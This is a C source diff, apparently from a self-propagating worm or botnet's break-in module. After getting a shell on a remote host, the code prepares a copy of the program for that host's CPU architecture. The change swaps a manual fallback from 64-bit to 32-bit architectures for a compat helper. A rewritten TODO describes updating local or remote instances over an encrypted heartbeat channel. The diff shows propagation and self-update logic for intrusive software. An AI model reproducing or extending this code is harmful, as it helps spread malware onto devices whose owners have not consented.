@@ -1293,7 +1293,9 @@ END: // CATCH
 }
 
 static bool bne_sh_start_rcb (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
-	ctx->result.prc = prne_start_bin_rcb(
+	prne_arch_t actual;
+
+	ctx->result.prc = prne_start_bin_rcb_compat(
 		&sh_ctx->rcb,
 		ctx->result.arch,
 		ctx->param.rcb.self,
@@ -1302,36 +1304,24 @@ static bool bne_sh_start_rcb (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
 		ctx->param.rcb.exec_len,
 		ctx->param.rcb.m_dv,
 		ctx->param.rcb.dv_len,
-		ctx->param.rcb.ba);
+		ctx->param.rcb.ba,
+		&actual);
 
-	if (ctx->result.prc == PRNE_PACK_RC_NO_ARCH) {
-		// retry with compatible arch if available
-		switch (ctx->result.arch) {
-		case PRNE_ARCH_AARCH64:
-		case PRNE_ARCH_ARMV7:
-			ctx->result.arch = PRNE_ARCH_ARMV4T;
-			break;
-		case PRNE_ARCH_X86_64:
-			ctx->result.arch = PRNE_ARCH_I686;
-			break;
-		default: return false;
+	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		if (ctx->result.prc == PRNE_PACK_RC_OK) {
+			if (actual != ctx->result.arch) {
+				prne_dbgpf(
+					"bne sh@%"PRIxPTR"\t: using compat arch %s\n",
+					(uintptr_t)ctx,
+					prne_arch_tostr(ctx->result.arch));
+			}
 		}
-		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
+		else {
 			prne_dbgpf(
-				"bne sh@%"PRIxPTR"\t: retrying bin_rcb with compat arch %s\n",
+				"bne sh@%"PRIxPTR"\t: prne_start_bin_rcb_compat() - %s\n",
 				(uintptr_t)ctx,
-				prne_arch_tostr(ctx->result.arch));
+				prne_pack_rc_tostr(ctx->result.prc));
 		}
-		ctx->result.prc = prne_start_bin_rcb(
-			&sh_ctx->rcb,
-			ctx->result.arch,
-			ctx->param.rcb.self,
-			ctx->param.rcb.m_self,
-			ctx->param.rcb.self_len,
-			ctx->param.rcb.exec_len,
-			ctx->param.rcb.m_dv,
-			ctx->param.rcb.dv_len,
-			ctx->param.rcb.ba);
 	}
 
 	return ctx->result.prc == PRNE_PACK_RC_OK;
@@ -1829,9 +1819,11 @@ static bool bne_do_vec_htbt (prne_bne_t *ctx) {
 		&ssl,
 		PRNE_HTBT_TLS_ALP);
 	if (ret) {
-/* here goes ...
+/* TODO: here goes ...
 *
-* - Check the program version and update if necessary via PRNE_HTBT_OP_NY_BIN
+* - Take an array of previous versions as param
+* - Check the program version of the remote instance and update local or remote
+*	instance if necessary using PRNE_HTBT_OP_UP_BIN or PRNE_HTBT_OP_RCB
 */
 		prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
 		if (prne_mbedtls_pth_handle(&ssl, mbedtls_ssl_close_notify, fd, ev)) {
